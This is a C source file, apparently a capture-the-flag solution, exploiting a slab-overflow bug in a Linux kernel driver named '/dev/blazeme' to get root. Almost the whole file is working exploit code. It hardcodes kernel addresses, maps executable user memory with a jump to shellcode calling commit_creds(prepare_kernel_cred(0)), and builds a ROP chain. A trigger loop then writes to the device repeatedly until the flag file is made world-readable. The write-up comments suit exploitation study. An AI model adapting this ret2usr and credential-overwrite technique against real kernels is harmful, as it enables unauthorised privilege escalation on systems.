#include <sys/mman.h>

// Since there was no KASLR, I could just modify /etc/passwd user entry to uid 0 and get /proc/kallsyms after booting the modified image.
void (*commit_creds)(void *) = 0xffffffff81063960;
void *(*prepare_kernel_cred)(long) = 0xffffffff81063b50;
long (*sys_chmod)(char *, long) = 0xffffffff8110afc0;

void shellcode() {
	commit_creds(prepare_kernel_cred(0));
	sys_chmod("/flag", 0777);
	// well. let's do nothing! it doesn't make the system reboot.
}

int main() {
	int fd = open("/dev/blazeme", 1);
	char buf[1000];
	long *cur = (char *)buf + 2;

	// Allocating shellcode, and it didn't have SMEP or SMAP.
	// Since it doesn't have kASLR I could disable it from simple ROP payload I think
	char *a = mmap(0x841000, 0x1000, 7, 34, -1, 0);
	a[0xf0f] = 0xe9;
	*(int *)(a + 0xf10) = (shellcode - (long)(a + 0xf14));

	// while(1) would work. It has some probability, but the server doesn't crash, the process only crashed.
	for(int i = 0; i < 10000; i++) {
		// This is used to find which offset is used when executing retn.
		for(int j = 0; j < 8; j++) {
			cur[j] = 0x1010101010101010LL + j * 0x101LL;
		}

		/* The linux kernel image was extracted by a script in linux kernel
		 * I could just jump to &shellcode, but since it had NULL bytes on address,
		 * I chose to jump an hardcoded address which was allocatable from user-space. */

		// pop rdx
		#define poprdx 0xFFFFFFFF81148E10

		// rdx: [0x841f0f] ...
		// call [rdx]
		#define call_ptr_rdx 0xFFFFFFFF81035056

		cur[2] = poprdx;
		cur[3] = 0xFFFFFFFF810196E8;
		cur[4] = call_ptr_rdx;

		memset(buf, 0x41, 2); // Hello, <input> --> Hello, is 6bytes. 2byte padding for rop.

		// Trigger!
		// The vulnerability was, since kalloc is SLAB allocator with no padding after the content,
		// it can be like,
		// -----------------------------------------------------------------------
		// | AAAAAAAA... (64 chars) | AAAAAAA ... (64 chars) | ... (allocations) |
		// -----------------------------------------------------------------------
		// So Stack BOF occurs in a probability. It can be deterministic maybe?
		write(fd, (char *)buf, 64);
	}
}
